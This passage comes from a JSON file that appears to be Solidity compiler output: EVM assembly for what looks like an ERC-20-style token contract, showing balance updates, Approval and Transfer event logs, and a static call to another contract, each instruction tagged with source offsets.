											"name": "SWAP3"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "SWAP2"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "DUP2"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "SWAP1"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "SUB"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "SWAP1"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "SWAP2"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "ADD"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "SWAP1"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "LOG1"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "POP"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "POP"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "POP"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "POP"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "POP"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "POP"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "tag",
											"value": "183"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP1"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP5"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "AND"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2544,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "SWAP1"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP1"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP4"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "KECCAK256"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP5"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP8"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "AND"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP1"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP5"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP5"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP3"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP2"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP3"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP1"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "KECCAK256"
										},
										{
											"begin": 2535,
											"end": 2568,
											"name": "DUP6"
										},
										{
											"begin": 2535,
											"end": 2568,
											"name": "SWAP1"
										},
										{
											"begin": 2535,
											"end": 2568,
											"name": "SSTORE"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "MLOAD"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP6"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "MSTORE"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "MLOAD"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP3"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP1"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SUB"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP1"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "ADD"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP1"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "LOG3"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "POP"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "POP"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "POP"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "tag",
											"value": "190"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "DUP4"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "AND"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "SWAP1"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "DUP2"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "MSTORE"
										},
										{
											"begin": 2723,
											"end": 2732,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "MSTORE"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "SWAP1"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "KECCAK256"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "SLOAD"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "PUSH [tag]",
											"value": "346"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "SWAP1"
										},
										{
											"begin": 2743,
											"end": 2748,
											"name": "DUP3"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2723,
											"end": 2742,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "AND"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "tag",
											"value": "346"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP6"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "AND"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "SWAP1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP2"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "MSTORE"
										},
										{
											"begin": 2705,
											"end": 2714,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "MSTORE"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP3"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "KECCAK256"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SWAP4"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SWAP1"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SWAP4"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SSTORE"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "SWAP1"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "DUP5"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "AND"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "DUP2"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "MSTORE"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "KECCAK256"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "SLOAD"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "PUSH [tag]",
											"value": "347"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "SWAP1"
										},
										{
											"begin": 2793,
											"end": 2798,
											"name": "DUP3"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2775,
											"end": 2792,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "AND"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "tag",
											"value": "347"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP5"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "AND"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "MSTORE"
										},
										{
											"begin": 2759,
											"end": 2768,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "MSTORE"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP3"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "KECCAK256"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SWAP5"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SWAP1"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SWAP5"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SSTORE"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "MLOAD"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP6"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP2"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "MSTORE"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "MLOAD"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP4"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP3"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP8"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "AND"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP3"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP2"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP3"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SUB"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "ADD"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "LOG3"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "POP"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "POP"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "POP"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "tag",
											"value": "204"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "JUMPDEST"
										},
										{
											"begin": 4111,
											"end": 4121,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4133,
											"end": 4146,
											"name": "DUP1"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "SWAP1"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "SLOAD"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "SWAP1"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "EXP"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "SWAP1"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4165,
											"end": 4172,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4149,
											"end": 4179,
											"name": "AND"
										},
										{
											"begin": 4149,
											"end": 4179,
											"name": "PUSH",
											"value": "17E7E58"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "MLOAD"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "DUP2"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "AND"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "SHL"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "DUP2"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "MSTORE"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "ADD"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "MLOAD"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "DUP1"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "DUP4"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "SUB"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "DUP2"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "DUP7"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "DUP1"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "350"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "350"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "POP"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "GAS"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "STATICCALL"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "351"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "351"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "POP"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "POP"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "POP"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "POP"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "MLOAD"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "352"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "352"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "MLOAD"
										},
										{
											"begin": 4242,
											"end": 4247,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 4242,
											"end": 4247,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4199,
											"end": 4218,
											"name": "DUP3"
										},
										{
											"begin": 4199,
											"end": 4218,
											"name": "AND"
										},
										{
											"begin": 4199,
											"end": 4218,
											"name": "ISZERO"
										},
										{
											"begin": 4199,
											"end": 4218,
											"name": "DUP1"
										},
										{
											"begin": 4199,
											"end": 4218,
											"name": "ISZERO"
										},
										{
											"begin": 4199,
											"end": 4218,
											"name": "SWAP5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "SWAP2"
										},
										{
											"begin": 4149,
											"end": 4181,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4242,
											"end": 4247,
											"name": "SWAP1"
										},
										{
											"begin": 4272,
											"end": 4910,
											"name": "PUSH [tag]",
											"value": "353"
										},
										{
											"begin": 4272,
											"end": 4910,
											"name": "JUMPI"
										},
										{
											"begin": 4301,
											"end": 4312,
											"name": "DUP1"
										},
										{
											"begin": 4301,
											"end": 4312,
											"name": "ISZERO"
										},
										{
											"begin": 4297,
											"end": 4843,
											"name": "PUSH [tag]",
											"value": "354"
										},
										{
											"begin": 4297,
											"end": 4843,
											"name": "JUMPI"
										},
										{
											"begin": 4332,
											"end": 4342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4345,
											"end": 4386,
											"name": "PUSH [tag]",
											"value": "355"
										},
										{
											"begin": 4355,
											"end": 4385,
											"name": "PUSH [tag]",
											"value": "208"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4355,
											"end": 4370,
											"name": "DUP9"
										},
										{
											"begin": 4355,
											"end": 4370,
											"name": "DUP2"
										},
										{
											"begin": 4355,
											"end": 4370,
											"name": "AND"
										},
										{
											"begin": 4355,
											"end": 4370,
											"name": "SWAP1"
										},
										{
											"begin": 4355,
											"end": 4385,
											"name": "DUP9"
										},
										{
											"begin": 4355,
											"end": 4385,
											"name": "AND"
										},
										{
											"begin": 4355,
											"end": 4385,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4355,
											"end": 4374,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4355,
											"end": 4385,
											"name": "AND"
										},
										{
											"begin": 4355,
											"end": 4385,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4345,
											"end": 4386,
											"name": "tag",
											"value": "355"
										},
										{
											"begin": 4345,
											"end": 4386,
											"name": "JUMPDEST"
										},
										{
											"begin": 4332,
											"end": 4386,
											"name": "SWAP1"
										},
										{
											"begin": 4332,
											"end": 4386,
											"name": "POP"
										},
										{
											"begin": 4404,
											"end": 4418,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4421,
											"end": 4438,
											"name": "PUSH [tag]",
											"value": "357"
										},
										{
											"begin": 4431,
											"end": 4437,
											"name": "DUP4"
										},
										{
											"begin": 4421,
											"end": 4430,
											"name": "PUSH [tag]",
											"value": "209"
										},
										{
											"begin": 4421,
											"end": 4438,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4421,
											"end": 4438,
											"name": "tag",
											"value": "357"
										},
										{
											"begin": 4421,
											"end": 4438,
											"name": "JUMPDEST"
										},
										{
											"begin": 4404,
											"end": 4438,
											"name": "SWAP1"
										},
										{
											"begin": 4404,
											"end": 4438,
											"name": "POP"
										},
										{
											"begin": 4468,
											"end": 4477,
											"name": "DUP1"
										},
										{
											"begin": 4460,
											"end": 4465,
											"name": "DUP3"
										},
										{
											"begin": 4460,
											"end": 4477,
											"name": "GT"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "ISZERO"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "JUMPI"
										},
										{
											"begin": 4501,
											"end": 4515,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4518,
											"end": 4608,
											"name": "PUSH [tag]",
											"value": "359"
										},
										{
											"begin": 4585,
											"end": 4586,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 4518,
											"end": 4555,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 4534,
											"end": 4554,
											"name": "PUSH [tag]",
											"value": "361"
										},
										{
											"begin": 4534,
											"end": 4539,
											"name": "DUP7"
										},
										{
											"begin": 4544,
											"end": 4553,
											"name": "DUP7"
										},
										{
											"begin": 4534,
											"end": 4554,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4534,
											"end": 4543,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 4534,
											"end": 4554,
											"name": "AND"
										},
										{
											"begin": 4534,
											"end": 4554,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4534,
											"end": 4554,
											"name": "tag",
											"value": "361"
										},
										{
											"begin": 4534,
											"end": 4554,
											"name": "JUMPDEST"
										},
										{
											"begin": 4518,
											"end": 4529,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4518,
											"end": 4529,
											"name": "SLOAD"
										},
										{
											"begin": 4518,
											"end": 4529,
											"name": "SWAP1"
										},
										{
											"begin": 4518,
											"end": 4555,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4518,
											"end": 4533,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4518,
											"end": 4555,
											"name": "AND"
										},
										{
											"begin": 4518,
											"end": 4555,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4518,
											"end": 4608,
											"name": "tag",
											"value": "359"
										},
										{
											"begin": 4518,
											"end": 4608,
											"name": "JUMPDEST"
										},
										{
											"begin": 4501,
											"end": 4608,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4630,
											"end": 4646,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4649,
											"end": 4684,
											"name": "PUSH [tag]",
											"value": "362"
										},
										{
											"begin": 4667,
